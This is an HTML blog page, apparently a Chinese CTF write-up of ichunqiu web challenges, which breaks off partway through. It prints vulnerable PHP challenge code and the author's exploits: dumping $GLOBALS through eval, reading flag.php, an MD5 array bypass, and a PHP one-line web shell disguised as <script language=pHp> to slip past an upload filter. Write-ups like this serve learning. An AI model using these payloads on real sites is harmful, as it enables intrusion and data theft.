@@ -1,0 +1,1806 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="ichunqiu 上web题writeup，题目按分值从小到大排序 爆破12345678include &quot;flag.php&quot;;$a &#x3D; @$_REQUEST[&amp;#x27;hello&amp;#x27;];if(!preg_match(&amp;#x27;&#x2F;^\w*$&#x2F;&amp;#x27;,$a ))&amp;#123;  die(&amp;#x27;ERROR&amp;#x27;);&amp;#125;eval(&quot;var_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ichunqiu 上web题writeup（持续更新）">
+<meta property="og:url" content="http://example.com/2018/04/20/%20ichunqiu%20%E4%B8%8Aweb%E9%A2%98writeup/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ichunqiu 上web题writeup，题目按分值从小到大排序 爆破12345678include &quot;flag.php&quot;;$a &#x3D; @$_REQUEST[&amp;#x27;hello&amp;#x27;];if(!preg_match(&amp;#x27;&#x2F;^\w*$&#x2F;&amp;#x27;,$a ))&amp;#123;  die(&amp;#x27;ERROR&amp;#x27;);&amp;#125;eval(&quot;var_">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://www.runoob.com/wp-content/uploads/2014/03/img_innerjoin.gif">
+<meta property="article:published_time" content="2018-04-20T14:23:15.000Z">
+<meta property="article:modified_time" content="2022-10-03T15:22:02.510Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.runoob.com/wp-content/uploads/2014/03/img_innerjoin.gif">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>ichunqiu 上web题writeup（持续更新） · b1cat`s log</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>b1cat`s</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">b1cat`s</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">ichunqiu 上web题writeup（持续更新）</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                ichunqiu 上web题writeup（持续更新）
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">4k</span>Reading time: <span class="post-count reading-time">20 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2018/04/20</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <p><em>ichunqiu 上web题writeup，题目按分值从小到大排序</em></p>
+<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\w*$/&#x27;</span>,<span class="variable">$a</span> ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;ERROR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>题目：flag为6位</p>
+<p>爆破emm居然信了去写脚本爆破 </p>
+<p>然后回头看了Wp说直接传递GLOBALS到$a  接着打印超全局变量 $GLOBALS   就ok ( too simple too young )</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">9</span>) &#123; [<span class="string">&quot;_GET&quot;</span>]=&gt; <span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="string">&quot;hello&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;GLOBALS&quot;</span> &#125; [<span class="string">&quot;_POST&quot;</span>]=&gt; <span class="keyword">array</span>(<span class="number">0</span>) &#123; &#125; [<span class="string">&quot;_COOKIE&quot;</span>]=&gt; <span class="keyword">array</span>(<span class="number">0</span>) &#123; &#125; [<span class="string">&quot;_FILES&quot;</span>]=&gt; <span class="keyword">array</span>(<span class="number">0</span>) &#123; &#125; [<span class="string">&quot;_REQUEST&quot;</span>]=&gt; <span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="string">&quot;hello&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;GLOBALS&quot;</span> &#125; [<span class="string">&quot;flag&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">38</span>) <span class="string">&quot;flag在一个长度为6的变量里面&quot;</span> [<span class="string">&quot;d3f0f8&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">42</span>) <span class="string">&quot;flag&#123;7879762c-8a32-4c49-87b0-c2f37a5f6209&#125;&quot;</span> [<span class="string">&quot;a&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;GLOBALS&quot;</span> [<span class="string">&quot;GLOBALS&quot;</span>]=&gt; *RECURSION* &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="爆破-2"><a href="#爆破-2" class="headerlink" title="爆破-2"></a>爆破-2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>题目：flag 不在变量里</p>
+<p>这里$$a 变成了$a, 不能读取全局变量，flag 在$a里只能是读文件了。</p>
+<p> file(‘flag.php’) </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot; string(32) &quot;</span><span class="variable">$flag</span> = <span class="string">&#x27;Too Young Too Simple&#x27;</span>; <span class="string">&quot; [2]=&gt; string(45) &quot;</span><span class="comment">#flag&#123;12d9939c-7ce7-4cc1-b750-504a135f69a7&#125;; &quot; &#125; </span></span><br></pre></td></tr></table></figure>
+
+<p><em>| file</em><em>() ， <strong>file_get_contents()</strong> 把文件读入一个字符串</em></p>
+<h2 id="爆破-3"><a href="#爆破-3" class="headerlink" title="爆破-3"></a>爆破-3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>] = <span class="string">&#x27;ea&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>]+<span class="number">120</span>&lt;<span class="title function_ invoke__">time</span>())&#123;</span><br><span class="line">  <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$str_rand</span> = <span class="title function_ invoke__">range</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>);</span><br><span class="line"><span class="variable">$str_rands</span> = <span class="variable">$str_rand</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">25</span>)].<span class="variable">$str_rand</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">25</span>)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>]==(<span class="variable">$value</span>[<span class="number">0</span>].<span class="variable">$value</span>[<span class="number">1</span>]) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]++;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;whoami&#x27;</span>] = <span class="variable">$str_rands</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$str_rands</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;nums&#x27;</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>题目：真的是爆破</p>
+<p>分析  </p>
+<p>传入的值value 的前两项要和session[‘whoami’] 相等，截取md5($value)后为0 </p>
+<p>num+1，新的session[‘whoami’] 生成后打印出来</p>
+<p>故$value以数组形式提交新值（ 第一次$value[]&#x3D;ea, MD5数组为flase 可绕过判断） </p>
+<p>当num&gt; 10 后打印flag</p>
+<p>10次可以写个脚本，也可以手动复制粘贴</p>
+<p>##想怎么传就怎么传，就是这么任性。</p>
+<p>tips:flag在flag.php中  </p>
+<p>那就上传一个一句话<code>&lt;?php eval($_POST[&#39;a&#39;]);</code> </p>
+<p>返回页面,访问发现输出了<code>eval($_POST[&#39;a&#39;]); </code></p>
+<p>猜测可能过滤了<code>&lt;?</code> <code>php</code> </p>
+<p>再次上传<code>&lt;script language=pHp&gt;@eval($_POST[&#39;a&#39;])&lt;/script&gt;</code>  </p>
+<p>访问一句话  获取shell 在&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php 获取flag</p>
+<p>顺便看了看index.php 中的过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="variable">$next</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/&lt;\\?/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">          <span class="variable">$next</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/php/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$next</span>);</span><br></pre></td></tr></table></figure>
+
+<p><em>|  看WP是fopen打开flag.php 输出到当前文件里</em></p>
+<p>##考脑洞，你能过么？</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://fdb09252330c4580b0d9a36bca00562ac9f3773c00274287.game.ichunqiu.com/index.php?jpg=hei.jpg">http://fdb09252330c4580b0d9a36bca00562ac9f3773c00274287.game.ichunqiu.com/index.php?jpg=hei.jpg</a></li>
+</ul>
+<p>返回一张图片 查看源代码file:hei.jpg  猜测可能是file读取文件</p>
+<p>?jpg&#x3D;index.php  返回base64编码后的index.php源码</p>
+<ul>
+<li>index.php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>]))</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?jpg=hei.jpg&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;title&gt;file:&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;&lt;/title&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;config&quot;</span>,<span class="string">&quot;_&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span>.<span class="variable">$txt</span>.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试跨目录读取flag.php 无果</p>
+<p>这里有个隐藏条件   <strong>Created by PhpStorm.</strong>  得知有idea隐藏文件夹</p>
+<p>.idea&#x2F;workspace.xml 里面含有文件目录信息</p>
+<p>访问 &#x2F;.idea&#x2F;workspace.xml 可得有两个文件存在f13g_ichunqiu.php ，config.php </p>
+<p>猜测flag 在config.php </p>
+<p>由index.php 可知config会被替换为_  ，同时_被替换为空</p>
+<p>所以通过访问 f13gconfigichuqniu.php 来访问f13g_ichunqiu.php </p>
+<p>返回一个<code>Set-Cookie: user=RmN5ShdGChhI</code></p>
+<p>猜测可能需要提交类似user&#x3D;admin的cookie</p>
+<p><code>?jpg=f13g_ichunqiu.php</code>读一下源码</p>
+<ul>
+<li>fl3g_ichunqiu.php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td 